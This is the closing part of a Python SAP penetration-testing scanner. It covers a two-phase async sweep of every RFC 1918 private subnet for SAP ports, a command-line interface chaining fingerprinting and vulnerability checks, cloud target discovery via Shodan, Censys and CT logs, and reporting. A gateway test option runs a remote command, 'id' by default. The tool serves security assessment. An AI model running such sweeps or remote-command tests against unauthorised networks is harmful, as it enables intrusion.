    console.print("[white]  Strategy:    Two-phase async sweep (subnet → host)")
    console.print("[white]  Concurrency: %d simultaneous probes" % concurrency)
    console.print("[white]  Timeout:     %.1fs per probe" % timeout)
    console.print("[bold red]" + "=" * 62)
    console.print()

    # Generate all /24 subnets per range (kept separate so Phase 1 can
    # process each range independently to avoid network congestion).
    range_subnets = []
    all_subnets = []
    for range_str in HAIL_MARY_RANGES:
        net = ipaddress.ip_network(range_str)
        subs = list(net.subnets(new_prefix=24))
        range_subnets.append((range_str, subs))
        all_subnets.extend(subs)

    total_subnets = len(all_subnets)
    phase1_probes = total_subnets * len(HAIL_MARY_SUBNET_SAMPLES) * len(HAIL_MARY_PHASE1_PORTS)

    console.print("[cyan]  Phase 1:[/cyan] Sweeping %d /24 subnets "
                  "(%d probes on ports %s)" % (
                      total_subnets, phase1_probes,
                      ", ".join(str(p) for p in HAIL_MARY_PHASE1_PORTS)))

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%%"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        # --- Phase 1: Subnet liveness sweep ---
        p1_task = progress.add_task(
            "[cyan]Subnet sweep", total=phase1_probes)

        live_subnets = asyncio.run(
            _hm_phase1(range_subnets, timeout, concurrency, progress, p1_task, console))

    console.print("[green]  Phase 1 complete:[/green] "
                  "[bold]%d[/bold] live /24 subnets out of %d"
                  % (len(live_subnets), total_subnets))

    if not live_subnets:
        console.print("[yellow]  No live subnets found — no SAP systems to scan.[/yellow]")
        return []

    # Brief cooldown to let the network stack recover from Phase 1's
    # million+ probes (clear TIME_WAIT sockets, ARP cache pressure, etc.)
    import time
    time.sleep(3)

    # --- Phase 2: Full host sweep on live subnets ---
    phase2_hosts = sum(s.num_addresses - 2 for s in live_subnets)
    phase2_probes = phase2_hosts * len(HAIL_MARY_PROBE_PORTS)
    console.print("[cyan]  Phase 2:[/cyan] Scanning %d hosts in live subnets "
                  "(%d probes on %d SAP ports)" %
                  (phase2_hosts, phase2_probes, len(HAIL_MARY_PROBE_PORTS)))

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%%"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        p2_task = progress.add_task(
            "[cyan]Host sweep", total=phase2_probes)

        # Use a longer timeout for Phase 2 — it has far fewer probes and
        # runs right after Phase 1 saturated the network stack.
        p2_timeout = max(timeout * 2, 1.0)
        sap_hosts = asyncio.run(
            _hm_phase2(live_subnets, p2_timeout, concurrency, progress, p2_task))

    console.print("[green]  Phase 2 first pass:[/green] "
                  "[bold]%d[/bold] potential SAP host(s) found" % len(sap_hosts))

    # Retry pass: re-probe non-SAP hosts with reduced concurrency and
    # longer timeout to catch hosts missed due to transient congestion.
    retry_hosts = phase2_hosts - len(sap_hosts)
    retry_probes = retry_hosts * len(HAIL_MARY_PROBE_PORTS)
    if retry_probes > 0:
        console.print("[cyan]  Phase 2 retry:[/cyan] Re-probing %d hosts "
                      "(%d probes, reduced concurrency)" %
                      (retry_hosts, retry_probes))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            MofNCompleteColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%%"),
            TimeElapsedColumn(),
            console=console,
            transient=False,
        ) as progress:
            retry_task = progress.add_task(
                "[cyan]Retry sweep", total=retry_probes)
            sap_hosts = asyncio.run(
                _hm_phase2_retry(live_subnets, p2_timeout, concurrency,
                                 sap_hosts, progress, retry_task))

    console.print("[green]  Phase 2 complete:[/green] "
                  "[bold]%d[/bold] SAP host(s) discovered" % len(sap_hosts))
    console.print()

    if sap_hosts:
        for h in sorted(sap_hosts,
                        key=lambda x: tuple(int(o) for o in x.split("."))):
            console.print("    [bold green]>>>[/bold green] %s" % h)
        console.print()

    return sorted(sap_hosts,
                  key=lambda x: tuple(int(o) for o in x.split(".")))


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 11: Main Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="SAP Network Topology Scanner - Discover, fingerprint, and assess SAP systems",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
hail mary mode (--hail-mary):
  Scans ALL RFC 1918 private subnets for SAP systems:
    192.168.0.0/16   (65,536 IPs)
    172.16.0.0/12    (1,048,576 IPs)
    10.0.0.0/8       (16,777,216 IPs)
    Total:           ~17.9 million IP addresses across 69,888 /24 subnets

  Uses a two-phase async discovery algorithm to make this tractable:

  Phase 1 - Subnet Sweep (~1.1M probes with default offsets):
    For each /24 subnet, probes sample IPs at configurable offsets
    (default: .1, .2, .5, .10, .21, .29, .50, .80) on ports 3200
    (SAP DIAG) and 443 (HTTPS/ICM). Use --hm-offsets to customize.
    Uses asyncio with a 0.5s timeout per probe. A TCP connection OR a
    connection-refused (RST) marks the /24 as live. Unreachable subnets
    fail instantly ('no route to host'), so most of the address space is
    eliminated in seconds. Each RFC 1918 range is processed separately
    with a 2s pause between ranges to prevent network congestion.
    Typically 99%+ of /24s are pruned in this phase.

  Phase 2 - Host Sweep (only live /24s):
    For each live /24 found in Phase 1, scans all 254 hosts on 203 SAP
    indicator ports: 3200-3399 (DIAG + Gateway for all instances),
    50013 (SAPControl), 1128-1129 (SAPHostControl). Any IP with an open
    SAP port is added to the target list. Concurrency is capped at 500
    to avoid packet loss. Subnets are processed in groups of 100 to
    limit memory usage. A retry pass with reduced concurrency (200) and
    doubled timeout catches hosts missed due to transient congestion.
    A 3s cooldown separates Phase 1 and Phase 2.

  After discovery, all found SAP hosts are merged with any explicit
  --target/--target-file hosts and fed into the normal scan pipeline
  (port scan, fingerprinting, vulnerability assessment, reporting).

  Performance: concurrency is auto-tuned from the OS file descriptor
  limit (up to 4000 simultaneous probes). The soft FD limit is raised
  to 8192 automatically where possible (e.g. macOS default of 256).

  Can be combined with --target to scan specific hosts in addition to
  the private subnet sweep.

examples:
  sap_scanner.py --target 192.168.2.209
  sap_scanner.py --target 10.0.0.0/24 --instances 00-05
  sap_scanner.py --hail-mary
  sap_scanner.py --hail-mary --hm-offsets 1,10,50,100,150,200,250
  sap_scanner.py --hail-mary --target 192.168.2.209 --skip-vuln
  sap_scanner.py --target-file hosts.txt --json results.json
""",
    )
    parser.add_argument("--target", "-t", help="Target IP, hostname, or CIDR (comma-separated)")
    parser.add_argument("--target-file", "-T", help="File with one target per line")
    parser.add_argument("--instances", default="00-99",
                        help="Instance range to scan (default: 00-99). Examples: 00-99, 00,01,10")
    parser.add_argument("--timeout", type=int, default=3,
                        help="Per-connection timeout in seconds (default: 3)")
    parser.add_argument("--threads", type=int, default=20,
                        help="Number of parallel scan threads (default: 20)")
    parser.add_argument("--output", "-o", default=None,
                        help="HTML report output path (default: SAPology_YYYYMMDD_HHMMSS.html)")
    parser.add_argument("--json", dest="json_output",
                        help="JSON export path")
    parser.add_argument("--skip-vuln", action="store_true",
                        help="Skip vulnerability checks")
    parser.add_argument("--skip-url-scan", action="store_true",
                        help="Skip ICM URL scanning (1633 paths per HTTP port)")
    parser.add_argument("--url-scan-threads", type=int, default=25,
                        help="Parallel threads for URL scanning (default: 25)")
    parser.add_argument("--gw-test-cmd", default="id",
                        help="Command for gateway SAPXPG test (default: id)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("--hail-mary", action="store_true",
                        help="Scan ALL RFC 1918 private subnets (~17.9M IPs) for SAP systems. "
                             "Uses two-phase async discovery: Phase 1 probes 8 sample IPs per "
                             "/24 subnet on ports 3200 and 443 to find live subnets, Phase 2 "
                             "scans all hosts in live /24s on 203 SAP indicator ports (3200-3399, "
                             "50013, 1128, 1129). See below for full details.")
    parser.add_argument("--hm-offsets",
                        help="Custom host offsets for hail-mary Phase 1 subnet sampling "
                             "(comma-separated, 1-254). Default: 1,2,5,10,21,29,50,80. "
                             "Example: --hm-offsets 1,5,10,50,100,200")

    # BTP Cloud Scanning
    btp_group = parser.add_argument_group("BTP Cloud Scanning")
    btp_group.add_argument("--btp", action="store_true",
                           help="Enable BTP cloud scanning mode")
    btp_group.add_argument("--btp-target",
                           help="Target BTP URL or hostname (comma-separated)")
    btp_group.add_argument("--btp-discover",
                           help="Search CT logs for org keyword")
    btp_group.add_argument("--btp-domain",
                           help="Target custom domain (e.g., mycompany.com)")
    btp_group.add_argument("--btp-subaccount",
                           help="Known subaccount identifier")
    btp_group.add_argument("--btp-targets",
                           help="File with known BTP URLs (one per line)")
    btp_group.add_argument("--btp-regions", default="all",
                           help="Comma-separated BTP regions (default: all)")
    btp_group.add_argument("--btp-skip-ct", action="store_true",
                           help="Skip Certificate Transparency log search")
    btp_group.add_argument("--btp-skip-vuln", action="store_true",
                           help="Skip BTP vulnerability assessment")
    btp_group.add_argument("--shodan-key",
                           help="Shodan API key for infrastructure discovery")
    btp_group.add_argument("--censys-id",
                           help="Censys API ID")
    btp_group.add_argument("--censys-secret",
                           help="Censys API secret")

    args = parser.parse_args()

    has_btp = (args.btp or args.btp_target or args.btp_discover or args.btp_domain
               or args.btp_subaccount or args.btp_targets)
    if not args.hail_mary and not args.target and not args.target_file and not has_btp:
        parser.error("At least one of --target, --target-file, --hail-mary, or --btp* is required")

    global VERBOSE
    VERBOSE = args.verbose

    # --- Hail Mary: async discovery of SAP hosts across all private subnets ---
    if args.hm_offsets:
        global HAIL_MARY_SUBNET_SAMPLES
        offsets = []
        for part in args.hm_offsets.split(","):
            val = int(part.strip())
            if val < 1 or val > 254:
                parser.error("--hm-offsets values must be between 1 and 254, got %d" % val)
            offsets.append(val)
        HAIL_MARY_SUBNET_SAMPLES = sorted(set(offsets))

    hail_mary_hosts = []
    if args.hail_mary:
        if not HAS_RICH:
            parser.error("--hail-mary requires the 'rich' library: pip install rich")
        hail_mary_hosts = hail_mary_discover(
            timeout=0.5, verbose=args.verbose)
        if not hail_mary_hosts:
            print("[*] Hail Mary found no SAP hosts on private subnets")

    # Parse explicit targets (if any) and merge with hail mary results
    targets = parse_targets(args.target, args.target_file)
    if hail_mary_hosts:
        existing = set(targets)
        for h in hail_mary_hosts:
            if h not in existing:
                targets.append(h)
                existing.add(h)

    if not targets and not has_btp:
        print("[-] No valid targets specified")
        sys.exit(1)

    start_time = time.time()
    landscape = []
    btp_results = None

    # ── On-prem scanning ──
    if targets:
        instances = parse_instance_range(args.instances)

        print("[*] Targets: %s" % ", ".join(targets[:10]))
        if len(targets) > 10:
            print("    ... and %d more" % (len(targets) - 10))
        print("[*] Instance range: %s" % ", ".join("%02d" % i for i in instances))
        print("[*] Threads: %d, Timeout: %ds" % (args.threads, args.timeout))

        scan_params = {
            "targets": targets,
            "instances": ["%02d" % i for i in instances],
            "timeout": args.timeout,
            "threads": args.threads,
            "skip_vuln": args.skip_vuln,
            "gw_test_cmd": args.gw_test_cmd,
            "url_scan": not args.skip_url_scan,
            "url_scan_threads": args.url_scan_threads,
            "output": args.output or "auto",
            "json_output": args.json_output or "not used",
            "target_file": args.target_file or "not used",
            "verbose": args.verbose,
            "hail_mary": args.hail_mary,
            "hail_mary_hosts_found": len(hail_mary_hosts),
        }
        if has_btp:
            scan_params["btp_target"] = args.btp_target or ""
            scan_params["btp_discover"] = args.btp_discover or ""
            scan_params["btp_domain"] = args.btp_domain or ""
            scan_params["btp_subaccount"] = args.btp_subaccount or ""
            scan_params["btp_targets"] = args.btp_targets or ""
            scan_params["btp_regions"] = args.btp_regions or "all"
            scan_params["btp_skip_ct"] = args.btp_skip_ct
            scan_params["btp_skip_vuln"] = args.btp_skip_vuln
            scan_params["shodan_key"] = "***" if args.shodan_key else ""
            scan_params["censys_id"] = "***" if args.censys_id else ""
            scan_params["censys_secret"] = "***" if args.censys_secret else ""

        # Phase 1: Discovery
        print("\n" + "=" * 60)
        print(" Phase 1: System Discovery & Fingerprinting")
        print("=" * 60)
        landscape = discover_systems(targets, instances, args.timeout, args.threads, args.verbose)

        if not landscape and not has_btp:
            print("\n[-] No SAP systems discovered")
            sys.exit(0)

        # Phase 2: Vulnerability Assessment
        if landscape and not args.skip_vuln:
            print("\n" + "=" * 60)
            print(" Phase 2: Vulnerability Assessment")
            print("=" * 60)
            landscape = assess_vulnerabilities(landscape, args.gw_test_cmd, args.timeout + 2, args.verbose,
                                                url_scan=not args.skip_url_scan,
                                                url_scan_threads=args.url_scan_threads)
        elif args.skip_vuln:
            print("\n[*] Skipping vulnerability checks (--skip-vuln)")
    else:
        scan_params = {
            "timeout": args.timeout,
            "threads": args.threads,
            "verbose": args.verbose,
            "output": args.output or "auto",
            "btp_target": args.btp_target or "",
            "btp_discover": args.btp_discover or "",
            "btp_domain": args.btp_domain or "",
            "btp_subaccount": args.btp_subaccount or "",
            "btp_targets": args.btp_targets or "",
            "btp_regions": args.btp_regions or "all",
            "btp_skip_ct": args.btp_skip_ct,
            "btp_skip_vuln": args.btp_skip_vuln,
            "shodan_key": "***" if args.shodan_key else "",
            "censys_id": "***" if args.censys_id else "",
            "censys_secret": "***" if args.censys_secret else "",
        }

    # ── BTP Cloud Scanning ──
    if has_btp:
        print("\n" + "=" * 60)
        print(" BTP Cloud Scanning")
        print("=" * 60)
        try:
            from SAPology_btp import BTPScanner
            btp_config = {
                "target": args.btp_target,
                "keyword": args.btp_discover,
                "domain": args.btp_domain,
                "subaccount": args.btp_subaccount,
                "targets_file": args.btp_targets,
                "regions": args.btp_regions,
                "skip_ct": args.btp_skip_ct,
                "skip_vuln": args.btp_skip_vuln,
                "shodan_key": args.shodan_key,
                "censys_id": args.censys_id,
                "censys_secret": args.censys_secret,
                "verbose": args.verbose,
                "threads": args.threads,
                "timeout": args.timeout,
            }
            btp_scanner = BTPScanner(btp_config)
            btp_results = btp_scanner.run()
        except ImportError:
            print("[-] SAPology_btp.py not found — BTP scanning unavailable")
        except Exception as e:
            print("[-] BTP scanning error: %s" % e)

    scan_duration = time.time() - start_time

    # ── Output ──
    print("\n" + "=" * 60)
    print(" Results")
    print("=" * 60)
    if landscape:
        print_terminal_summary(landscape)

    # Generate HTML report
    output_path = args.output
    if output_path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if has_btp and not landscape:
            output_path = "SAPology_BTP_%s.html" % ts
        elif has_btp:
            output_path = "SAPology_Full_%s.html" % ts
        else:
            output_path = "SAPology_%s.html" % ts
    if landscape or btp_results:
        print("\n[*] Generating HTML report: %s" % output_path)
        generate_html_report(landscape, output_path, scan_duration, scan_params,
                             btp_results=btp_results)
        print("[+] HTML report saved to: %s" % output_path)

    # Generate JSON export
    if args.json_output:
        print("[*] Generating JSON export: %s" % args.json_output)
        generate_json_export(landscape, args.json_output, btp_results=btp_results)
        print("[+] JSON export saved to: %s" % args.json_output)

    # Summary
    total_findings = sum(len(s.all_findings()) for s in landscape)
    if btp_results:
        total_findings += btp_results.total_findings
    critical = sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.CRITICAL)
    dur_h = int(scan_duration // 3600)
    dur_m = int((scan_duration % 3600) // 60)
    dur_s = int(scan_duration % 60)
    print("\n[*] Scan complete in %d:%02d:%02d" % (dur_h, dur_m, dur_s))
    print("[*] %d system(s), %d finding(s) (%d critical)" % (
        len(landscape), total_findings, critical))


if __name__ == "__main__":
    main()
